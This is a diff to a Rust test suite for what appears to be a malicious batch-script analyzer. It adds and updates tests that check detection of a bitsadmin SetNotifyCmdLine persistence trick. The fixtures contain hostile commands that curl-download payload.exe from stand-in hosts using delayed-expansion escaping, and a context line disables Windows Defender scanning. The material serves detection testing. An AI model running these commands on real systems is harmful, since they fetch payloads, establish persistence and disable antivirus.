@@ -12487,6 +12487,32 @@ mod bitsadmin_tests {
     }
 
     #[test]
+    fn bitsadmin_setnotifycmdline_preserves_escaped_delayed_child() {
+        let report = analyze(
+            br#"setlocal EnableDelayedExpansion
+bitsadmin /SetNotifyCmdLine job1 "%COMSPEC%" "/V:ON /c set U=https://bits-notify-escaped.example/payload.exe&&curl -o payload.exe ^!U^!""#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download {
+                        src,
+                        dst: Some(dst),
+                        ..
+                    } if src == "https://bits-notify-escaped.example/payload.exe"
+                        && dst == "payload.exe"
+                )
+            }),
+            "escaped BITS notify delayed child command was not recursively analyzed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn bitsadmin_setnotifycmdline_in_deob_text_emits_persistence() {
         let mut env = Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -26596,7 +26622,7 @@ powershell -Command "Set-MpPreference -DisableArchiveScanning $true -DisableEmai
                 matches!(
                     t,
                     Trait::Persistence { command, .. }
-                        if command == r#"cmd.exe /V:ON /c set U=https://copied-bits-notify.example/payload.exe&&curl -o payload.exe ^!U^!"#
+                        if command == r#"cmd.exe /V:ON /c set U=https://copied-bits-notify.example/payload.exe&&curl -o payload.exe !U!"#
                 )
             }),
             "copied bitsadmin notify alias did not surface persistence: {:?}",
